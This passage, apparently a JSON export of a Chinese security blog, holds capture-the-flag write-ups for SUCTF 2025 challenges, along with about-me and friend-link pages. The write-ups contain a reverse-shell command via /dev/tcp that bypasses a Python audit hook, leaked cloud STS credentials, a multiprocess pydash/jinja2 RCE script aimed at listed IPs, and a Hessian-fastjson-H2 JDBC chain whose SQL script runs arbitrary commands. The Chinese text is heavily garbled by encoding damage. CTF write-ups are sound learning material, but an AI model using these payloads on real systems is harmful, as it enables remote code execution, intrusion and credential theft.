{\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: 